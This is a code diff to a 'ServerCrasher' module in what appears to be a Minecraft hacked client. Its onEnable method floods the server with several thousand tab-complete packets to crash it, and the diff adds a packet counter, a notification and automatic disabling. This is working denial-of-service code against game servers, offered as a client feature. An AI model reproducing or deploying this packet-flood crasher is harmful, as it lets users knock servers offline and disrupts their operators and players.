@@ -1,8 +1,10 @@
 package cn.snowflake.rose.mod.mods.WORLD;
 
 
+import cn.snowflake.rose.Client;
 import cn.snowflake.rose.mod.Category;
 import cn.snowflake.rose.mod.Module;
+import cn.snowflake.rose.notification.Notification;
 import cn.snowflake.rose.utils.Value;
 import net.minecraft.network.play.client.C14PacketTabComplete;
 
@@ -29,10 +31,13 @@ public class ServerCrasher extends Module {
 
     public void onEnable() {
         if (mode.isCurrentMode("C14TabComplete")){
+            int packets = 0;
             for (int i = 0; i < (1337 * 5); i++) {
-                this.setDisplayName("Packet :" + i);
                 mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("/"));
+                packets += 1;
             }
+            Client.instance.getNotificationManager().addNotification(this,"Packet : " + packets, Notification.Type.INFO);
+            set(false);
         }
     }
 
